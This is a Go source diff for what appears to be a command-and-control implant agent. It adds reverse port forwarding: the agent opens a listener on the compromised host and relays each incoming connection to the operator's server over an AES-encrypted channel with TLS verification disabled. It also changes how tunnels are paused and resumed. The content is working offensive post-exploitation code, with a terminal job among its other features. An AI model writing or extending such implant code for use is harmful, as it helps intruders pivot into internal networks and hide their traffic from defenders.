@@ -123,6 +123,12 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_TUNNEL_START:
 			jobTunnel(command.Data)
 
+		case utils.COMMAND_RPORTFWD_START:
+			data, err = taskRportfwdStart(command.Data)
+
+		case utils.COMMAND_RPORTFWD_STOP:
+			taskTunnelKill(command.Data)
+
 		case utils.COMMAND_TUNNEL_STOP:
 			taskTunnelKill(command.Data)
 
@@ -511,11 +517,11 @@ func taskTunnelKill(paramsData []byte) {
 	}
 }
 
-func taskTunnelPause(paramsData []byte) {
+func taskTunnelPause(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsTunnelPause
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
-		return
+		return nil, err
 	}
 
 	value, ok := TUNNELS.Load(params.ChannelId)
@@ -525,13 +531,14 @@ func taskTunnelPause(paramsData []byte) {
 			ctrl.Paused.Store(true)
 		}
 	}
+	return nil, nil
 }
 
-func taskTunnelResume(paramsData []byte) {
+func taskTunnelResume(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsTunnelResume
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
-		return
+		return nil, err
 	}
 
 	value, ok := TUNNELS.Load(params.ChannelId)
@@ -541,6 +548,7 @@ func taskTunnelResume(paramsData []byte) {
 			ctrl.Paused.Store(false)
 		}
 	}
+	return nil, nil
 }
 
 func taskUpload(paramsData []byte) ([]byte, error) {
@@ -1304,13 +1312,12 @@ func jobTunnel(paramsData []byte) {
 				RootCAs:            caCertPool,
 				InsecureSkipVerify: true,
 			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
+			srvConn, err = tls.Dial("tcp", activeAddr, config)
 
 		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
+			srvConn, err = net.Dial("tcp", activeAddr)
 		}
 		if err != nil {
-			srvConn.Close()
 			return
 		}
 
@@ -1414,6 +1421,175 @@ func jobTunnel(paramsData []byte) {
 
 		cancel()
 	}()
+}
+
+func taskRportfwdStart(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsRportfwdStart
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return nil, err
+	}
+
+	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", params.Port))
+	if err != nil {
+		return msgpack.Marshal(utils.AnsRportfwdStatus{TunnelId: params.TunnelId, Success: false})
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	ctrl := &TunnelController{Cancel: cancel}
+	TUNNELS.Store(params.TunnelId, ctrl)
+
+	go func() {
+		<-ctx.Done()
+		listener.Close()
+	}()
+
+	go func() {
+		defer TUNNELS.Delete(params.TunnelId)
+		defer listener.Close()
+		for {
+			conn, acceptErr := listener.Accept()
+			if acceptErr != nil {
+				return
+			}
+			go jobRportfwdConn(conn, params.TunnelId)
+		}
+	}()
+
+	return msgpack.Marshal(utils.AnsRportfwdStatus{TunnelId: params.TunnelId, Success: true})
+}
+
+func jobRportfwdConn(clientConn net.Conn, tunnelId int) {
+	channelId := int(func() uint32 {
+		b := make([]byte, 4)
+		rand.Read(b)
+		return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
+	}())
+	if channelId == 0 {
+		clientConn.Close()
+		return
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	ctrl := &TunnelController{Cancel: cancel}
+	TUNNELS.Store(channelId, ctrl)
+	defer TUNNELS.Delete(channelId)
+
+	var srvConn net.Conn
+	var err error
+	if profile.UseSSL {
+		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
+		if certerr != nil {
+			clientConn.Close()
+			cancel()
+			return
+		}
+		caCertPool := x509.NewCertPool()
+		caCertPool.AppendCertsFromPEM(profile.CaCert)
+		config := &tls.Config{
+			Certificates:       []tls.Certificate{cert},
+			RootCAs:            caCertPool,
+			InsecureSkipVerify: true,
+		}
+		srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
+	} else {
+		srvConn, err = net.Dial("tcp", profile.Addresses[0])
+	}
+	if err != nil {
+		clientConn.Close()
+		cancel()
+		return
+	}
+
+	tunKey := make([]byte, 16)
+	rand.Read(tunKey)
+	tunIv := make([]byte, 16)
+	rand.Read(tunIv)
+
+	jobPack, _ := msgpack.Marshal(utils.RportfwdPack{
+		Id:        uint(AgentId),
+		Type:      profile.Type,
+		TunnelId:  tunnelId,
+		ChannelId: channelId,
+		Key:       tunKey,
+		Iv:        tunIv,
+	})
+	jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.RPORTFWD_PACK, Data: jobPack})
+	jobMsg, _ = utils.EncryptData(jobMsg, encKey)
+
+	if profile.BannerSize > 0 {
+		if _, bannerErr := functions.ConnRead(srvConn, profile.BannerSize); bannerErr != nil {
+			srvConn.Close()
+			clientConn.Close()
+			cancel()
+			return
+		}
+	}
+
+	functions.SendMsg(srvConn, jobMsg)
+
+	encCipher, _ := aes.NewCipher(tunKey)
+	encStream := cipher.NewCTR(encCipher, tunIv)
+	streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
+
+	decCipher, _ := aes.NewCipher(tunKey)
+	decStream := cipher.NewCTR(decCipher, tunIv)
+	streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+
+	var closeOnce sync.Once
+	closeAll := func() {
+		closeOnce.Do(func() {
+			clientConn.Close()
+			srvConn.Close()
+		})
+	}
+
+	var wg sync.WaitGroup
+	wg.Add(2)
+
+	go func() {
+		defer wg.Done()
+		io.Copy(clientConn, streamReader)
+		closeAll()
+	}()
+
+	go func() {
+		defer wg.Done()
+		buf := make([]byte, 32*1024)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				if ctrl.Paused.Load() {
+					time.Sleep(50 * time.Millisecond)
+					continue
+				}
+				clientConn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+				nr, er := clientConn.Read(buf)
+				if nr > 0 {
+					if _, ew := streamWriter.Write(buf[:nr]); ew != nil {
+						closeAll()
+						return
+					}
+				}
+				if er != nil {
+					if netErr, ok := er.(net.Error); ok && netErr.Timeout() {
+						continue
+					}
+					closeAll()
+					return
+				}
+			}
+		}
+	}()
+
+	go func() {
+		<-ctx.Done()
+		closeAll()
+	}()
+
+	wg.Wait()
+	cancel()
 }
 
 func jobTerminal(paramsData []byte) {
